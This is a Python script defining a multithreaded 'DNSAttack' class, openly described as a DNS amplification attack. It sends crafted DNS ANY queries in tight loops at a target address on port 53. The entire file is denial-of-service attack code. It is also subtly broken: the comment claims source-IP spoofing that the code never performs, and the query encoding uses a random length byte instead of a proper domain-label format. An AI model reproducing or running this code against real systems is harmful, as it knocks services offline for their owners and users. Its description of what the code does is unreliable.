import socket
import threading
import random

class DNSAttack:
    def __init__(self, target_ip, domain, qps=50000):
        self.target_ip = target_ip
        self.domain = domain
        self.qps = qps
        self.running = False
        self.threads = []

    def dns_amp(self):
        """Send amplified DNS responses to target"""
        while self.running:
            try:
                # Spoof source IP to be the target
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.bind(('0.0.0.0', 0))
                
                # Craft DNS query for maximum amplification
                query = b"\xAA\xAA\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00"
                query += bytes([random.randint(1,63)]) + self.domain.encode() + b"\x00"
                query += b"\x00\xFF\x00\x01"
                
                s.sendto(query, (self.target_ip, 53))
                s.close()
            except:
                pass

    def start(self, threads=10):
        """Start DNS amplification attack"""
        self.running = True
        for _ in range(threads):
            t = threading.Thread(target=self.dns_amp)
            t.daemon = True
            t.start()
            self.threads.append(t)

    def stop(self):
        """Stop DNS amplification attack"""
        self.running = False
        for t in self.threads:
            t.join()
